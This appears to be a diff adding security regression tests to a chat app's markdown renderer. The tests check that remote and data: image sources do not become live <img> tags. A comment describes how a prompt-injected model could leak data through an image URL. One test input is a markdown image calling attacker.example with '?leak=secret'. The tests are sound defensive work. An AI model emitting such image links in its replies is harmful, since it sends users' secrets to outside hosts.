@@ -33,4 +33,22 @@ describe("renderMessageMarkdownToHtml", () => {
     expect(html).toContain('class="lmsa-md-table-wrap"');
     expect(html).toContain("<table>");
   });
+
+  // FINDING 3.2: markdown-it's image rule renders remote / data:image sources into a live
+  // <img>, which the Electron renderer fetches, an out-of-band exfiltration / tracking
+  // pixel channel for a prompt-injected model. No image element should reach the DOM.
+  test("does not emit a live <img> for a remote image source", () => {
+    const html = renderMessageMarkdownToHtml("![](https://attacker.example/pixel.png?leak=secret)");
+
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("attacker.example");
+  });
+
+  test("does not emit a live <img> for a data:image source", () => {
+    const html = renderMessageMarkdownToHtml(
+      "![alt](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGMAAQAABQAB)",
+    );
+
+    expect(html).not.toContain("<img");
+  });
 });
